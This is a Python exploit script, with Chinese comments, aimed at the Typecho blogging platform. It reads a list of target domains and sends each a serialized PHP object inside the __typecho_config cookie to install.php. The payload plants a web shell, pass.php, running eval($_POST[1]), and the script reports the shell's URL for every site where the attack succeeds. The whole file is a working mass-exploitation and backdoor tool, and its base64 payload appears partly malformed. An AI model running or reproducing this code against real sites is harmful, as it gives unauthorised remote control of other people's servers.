# -*- coding:utf-8 -*-
import requests,re
from bs4 import BeautifulSoup as bs

#从target_url中读取typecho网站域名
def get_file():
    try:
        with open('target_url.txt','r') as f:
            for url in f.readlines():
                url = re.split(' ',url)[0]
                url = str(url).strip()
                send(url)

    except:
        print("get_file error")
#发包，写webshell
def send(url):
    exp = 'YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NTp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIyOiIAVHlwZWNob19GZWVkAF92ZXJzaW9uIjtpOjE7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJlbiI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTc6ImZpbGVfcHV0X2NvbnRlbnRzKCdwYXNzLnBocCcsICc8P3BocCBldmFsKCRfUE9TVFsxXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NDoidGgxcyI7fQ==+JykiO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9fX19fXM6NjoicHJlZml4IjtzOjQ6InRoMXMiO30'
    referer = "http://"+url+"/admin"
    cookies = {'__typecho_config':exp}
    params = {"finish":1}      
    headers = {
        'Accept-Language': 'zh-CN,zh;q=0.8',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
        'Referer': referer,
        'Host' : url
        }
    attack_url = "http://" + url + "/install.php"
    exp_url ="http://" + url + "/pass.php"
    # print(attack_url)
    try:
        response = requests.get(attack_url,params=params,headers=headers,cookies=cookies)
        if response.status_code == 500:
            print("wonderful! url is "+ exp_url + "\n")
        else:
            print(response.status_code+"\n")
    except:
        print("requests error")



get_file()